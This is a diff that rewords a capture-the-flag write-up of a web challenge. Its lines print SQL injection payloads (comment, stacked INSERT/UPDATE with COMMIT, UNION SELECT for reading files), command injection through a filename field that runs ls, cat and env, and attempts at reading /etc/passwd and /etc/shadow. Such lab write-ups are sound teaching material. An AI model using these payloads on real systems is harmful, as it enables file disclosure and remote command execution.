@@ -40,15 +40,15 @@ However, navigating to further ids beyond 1,2,3 e.g. ```fetch?id=4```, ```fetch?
 > Not Found
 > The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
 
-This is interesting and likely indicates the file at ```id=3``` does exist, but cannot be read for whatever reason, maybe lack of permissions or the ```id=3``` somehow causes an error on the backend code (probably contains a flag).
+This likely indicates the file at ```id=3``` does exist, but cannot be read for whatever reason, maybe lack of permissions or the ```id=3``` somehow causes an error on the backend code (probably contains a flag).
 
-Testing this query further, using letters e.g. ```fetch?id=a```, ```fetch?id=zzz``` yields 500s.
+Testing this query further, using non-integers e.g. ```fetch?id=a```, ```fetch?id=zzz``` yields 500s.
 
 This indicates ```fetch?id=``` may use a SQL query and parameter ```id``` is of type ```INT```.
 
-Testing SQL comments injections ```fetch?id=1--%20comment``` and ```fetch?id=1#comment``` does not cause any errors and returns the same output. Likewise, trying AND injections e.g. ```fetch?id=1 AND 1=1``` returns the same output, and ```fetch?id=1 AND 1=2``` yields a 404. This confirms that ```fetch?id=``` uses a SQL query and is MySQL (only MySQL accepts # comments). This comment injection succeeding also indicates that the id parameter is either at the end of the SQL query or what is after the comment is inconsequential, which may or may not be important.
+Testing SQL comment injections ```fetch?id=1--%20comment``` and ```fetch?id=1#comment``` does not cause any errors and returns the same output. This confirms that ```fetch?id=``` uses a SQL query and is MySQL (only MySQL accepts # comments). This comment injection succeeding also indicates that the id parameter is either at the end of the SQL query or what is after the comment is inconsequential, which may or may not be important.
 
-Running ```sqlmap``` on ```fetch?id=1``` with option ```--dbs``` finds:
+See what ```sqlmap``` can find:
 
 ```
 sqlmap identified the following injection point(s) with a total of 653 HTTP(s) requests:
@@ -104,7 +104,7 @@ Therefore, the query probably looks something like this:
 SELECT filename FROM photos WHERE id=[]
 ```
 
-This is significant as it also shows the potential of stacked SQL queries i.e. it may be possible to make a query like ```SELECT filename FROM photos WHERE id=%d; INSERT into photos(...) values(...) #```
+Stacked SQL queries may be possible i.e. a query like ```SELECT filename FROM photos WHERE id=%d; INSERT into photos(...) values(...) #```
 
 Testing ```fetch?id=1;INSERT into photos(id,title,parent,filename) values(4,'hello world',1,'files/adorable.jpg')``` and navigating to ```fetch?id=4``` didn't work; 404 is still returned . However, adding the ```COMMIT``` command to the end i.e. ```fetch?id=1;INSERT (...); COMMIT #``` succeeds. Navigating to ```fetch?id=4``` now returns the .jpg text where a 404 was previously returned, proving the existence of a stacked query injection vulnerability.
 
@@ -122,13 +122,13 @@ Getting some hints:
 * Take a few minutes to consider the state of the union
 * This application runs on the uwsgi-nginx-flask-docker image
 
-This seems to convey that a ```UNION``` based SQL injection is also possible. It also says that the website runs on Docker, Flask, nginx, and uWSGI, which gives some insight as to what files may exist on the server.
+This suggests that a ```UNION``` based SQL injection is also possible. It also says that the website runs on Docker, Flask, nginx, and uWSGI, which gives some insight as to what files may exist on the server e.g. a Dockerfile may hold some useful info.
+
+As found earlier, the full SQL query used looks like ```SELECT filename FROM photos WHERE id=[]```, so it is selecting the filename to be opened and returned based on its ```id```. And since it was revealed that the webapp runs on Docker, it is possible that a Dockerfile exists and can be exposed with a ```UNION``` injection.
 
 So looking into this, trying ```fetch?id=1 UNION SELECT null``` yielded no errors and returned the same .jpg text, meaning this ```UNION``` injection succeeded.
 
-As found earlier, the full SQL query used looks like ```SELECT filename FROM photos WHERE id=[]```, so it is selecting the filename to be opened and returned. And since it was revealed that the webapp runs on Docker, it is possible that a Dockerfile exists (among other files) and can be exposed with a ```UNION``` injection.
-
-Trying ```fetch?id=1 UNION SELECT 'Dockerfile'``` didn't work. It's possible that only the first row in the values returned from the query is being used. E.g. this query returns
+Trying ```fetch?id=1 UNION SELECT 'Dockerfile'``` doesn't work. It's likely that only the first row in the values returned is being used. E.g. this query returns
 
 ```
 +---------------------+
@@ -145,7 +145,7 @@ So, the query can be reordered to put the injected filename at the top via the `
 
 > FROM tiangolo/uwsgi-nginx-flask:python2.7 WORKDIR /app RUN apt-get update RUN DEBIAN_FRONTEND=noninteractive apt-get install -y mysql-client mysql-server default-libmysqlclient-dev build-essential ADD requirements.txt /app/ RUN pip install --trusted-host pypi.python.org -r requirements.txt ADD . /app
 
-Another option is to force the query to return only the result of the ```UNION``` injection by making the ```WHERE id=``` portion of the query return nothing i.e. ```Dockerfile``` should be the only row returned and thus fed into the file open function. It is known that rows where ```id``` is greater than ```4``` do not exist. Leveraging this, ```fetch?id=9 UNION SELECT 'Dockerfile'``` will return the single row containing ```Dockerfile``` since no rows exist where id=9. This also succeeds in exposing the Dockerfile.
+Another option is to make the query to return only the result of the ```UNION``` injection by making the ```WHERE id=``` portion of the query return nothing i.e. ```fetch?id=9 UNION SELECT 'Dockerfile'``` will return the single row containing ```Dockerfile``` since no rows exist where id=9. This also succeeds in exposing the Dockerfile.
 
 Open ```requirements.txt``` as seen in the Dockerfile via ```fetch?id=9 UNION SELECT 'requirements.txt'``` shows:
 
@@ -153,7 +153,7 @@ Open ```requirements.txt``` as seen in the Dockerfile via ```fetch?id=9 UNION SE
 
 Nothing special, but confirms that any file any be read with this query.
 
-```tiangolo/uwsgi-nginx-flask:python2.7``` in the Dockerfile looks interesting, and Googling it leads to a Github repo at github.com/tiangolo/uwsgi-nginx-flask. Reading through the repo shows many potential files that likely exist on the server. The main Flask Python script is always named as ```main.py``` in this repo.
+```tiangolo/uwsgi-nginx-flask:python2.7``` in the Dockerfile looks interesting, and Googling it leads to a Github repo at github.com/tiangolo/uwsgi-nginx-flask. The repo shows many potential files that likely exist on the server. The main Flask Python script is always named as ```main.py``` in this repo.
 
 Try to read this Flask script ```main.py``` with the query ```fetch?id=9 UNION SELECT 'main.py'``` successfully returns:
 
@@ -221,7 +221,7 @@ if __name__ == "__main__":
 
 ## FLAG2
 
-Looking through ```main.py```, some vulnerable non-parameterzied SQL queries are evident, which have already been exploited to reach this point. However, very significantly a system call is made with no input sanitation or validation in the ```Space used:``` portion of the webapp:
+Looking through ```main.py```, some vulnerable SQL queries are evident, which have already been exploited to reach this point. However, very significantly a system call is made with no input sanitation or validation in the ```Space used:``` portion of the webapp:
 
 ```
 rep += '<i>Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1] + '</i>'
@@ -241,9 +241,9 @@ Now, ```fetch?id=1;UPDATE photos set filename=';ls | tr "\n" " "' WHERE id=3; CO
 
 > Space used: Dockerfile files main.py main.pyc prestart.sh requirements.txt uwsgi.ini
 
-Any file on the filesystem can be located via ```;ls | tr "\n" " "``` and printed via ```;cat [FILENAME] | tr "\n" " "```, which is a likely route to finding a flag.
+Therefore, any file on the filesystem can be located via ```;ls | tr "\n" " "``` and printed via ```;cat [FILENAME] | tr "\n" " "```, which is a likely route to finding a flag.
 
-Calling ```cat``` on suspicious targets including ```/etc/passwd``` and ```/etc/shadow``` yielded nothing. Going through the hints states: ```Be aware of your environment```
+Look for something interesting: Calling ```cat``` on suspicious targets including ```/etc/passwd``` and ```/etc/shadow``` yielded nothing. Going through the hints states: ```Be aware of your environment```
 
 So, try reading the environment variables via ```env``` i.e. ```fetch?id=1;UPDATE photos set filename='env | tr "\n" " "' WHERE id=3; COMMIT #``` which returns:
 
